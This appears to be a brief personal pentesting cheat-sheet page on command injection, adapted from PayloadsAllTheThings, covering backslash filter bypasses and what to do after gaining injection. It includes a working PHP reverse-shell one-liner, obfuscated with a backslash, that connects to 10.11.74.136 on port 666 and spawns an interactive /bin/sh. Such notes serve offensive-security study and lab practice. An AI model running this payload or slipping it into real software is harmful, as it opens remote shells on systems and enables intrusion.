---
title: Command Injection 💄
---
- Original content from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

## Filter Bypasses

- Commands can be broken into parts by using a backslash (`\`):

![](Pasted%20image%2020240417160455.png)

![](Pasted%20image%2020240417160920.png)

## What to do after obtaining one command injection?

- Now you have to conveniently encode a web shell as the ones located in [Reverse shells 👾](reverse_shells.md)
	- Example using backslash (`\`): 

```shell
ph\p -r '$sock=fsockopen("10.11.74.136",666);exec("/bin/sh -i <&3 >&3 2>&3");'
```